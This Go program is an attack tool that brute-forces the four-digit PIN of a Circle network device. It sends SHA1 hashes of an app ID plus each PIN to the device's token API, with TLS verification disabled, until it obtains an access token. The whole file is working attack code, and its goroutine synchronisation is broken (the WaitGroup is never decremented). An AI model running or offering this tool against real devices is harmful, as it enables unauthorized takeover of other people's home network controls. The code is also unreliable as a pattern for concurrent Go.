package main

import (
	"crypto/sha1"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"sync"
	"time"
)

type CircleSession struct {
	Client    http.Client
	IpAddress string
	Wg        sync.WaitGroup
}

const APPID = "HackMyCircleDevice99" // min length: 20

func (session *CircleSession) findCircleToken(start int, stop int) {
	for x := start; x <= stop; x++ {
		pincode := fmt.Sprintf("%04d", x)
		// show some progress
		if (x % 10) == 0 {
			fmt.Printf("PINCODE: %v\n", pincode)
		}
		h := sha1.New()
		h.Write([]byte(APPID + pincode))
		hash := fmt.Sprintf("%x", h.Sum(nil))
		//		fmt.Println(hash)

		start := time.Now()

		res, err := session.Client.Get("https://" + session.IpAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
		if (x % 10) == 0 {
			fmt.Printf("Get(): time elapsed: %v\n", time.Since(start))
		}
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(1)
		}
		// test url
		//res, err := http.Get("http://" + ipAddress + ":8000")
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(2)
		}
		res.Body.Close()
		data := map[string]interface{}{}
		json.Unmarshal(body, &data)
		//fmt.Println(data)
		if data["result"] == "success" {
			fmt.Printf("APPID  : %v\nPINCODE: %v\nTOKEN  : %v\n", APPID, pincode, data["token"])
			break
		} else {
			if data["error"] == "token request failure - invalid app id" {
				fmt.Println("Invalid APPID" + APPID)
				os.Exit(3)
			}
		}
	}
}

func main() {

	if len(os.Args) < 2 {
		fmt.Printf("usage: %v: <circle-ip-address>\n", os.Args[0])
		os.Exit(1)
	}

	ipAddress := os.Args[1]
	fmt.Printf("using ip address: %v\n", ipAddress)

	// NOTE: the following line doesn't work because the Circle device
	// doesn't have a certificate.  so, use an insecure connection instead
	//		res, err := http.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	session := &CircleSession{Client: http.Client{Transport: tr}, IpAddress: ipAddress}
	session.Wg.Add(1)
	go session.findCircleToken(0, 2500)
	session.Wg.Add(2)
	go session.findCircleToken(2501, 5000)
	session.Wg.Add(2)
	go session.findCircleToken(5001, 7500)
	session.Wg.Add(2)
	go session.findCircleToken(7501, 9999)
	session.Wg.Wait()
	os.Exit(0)
}
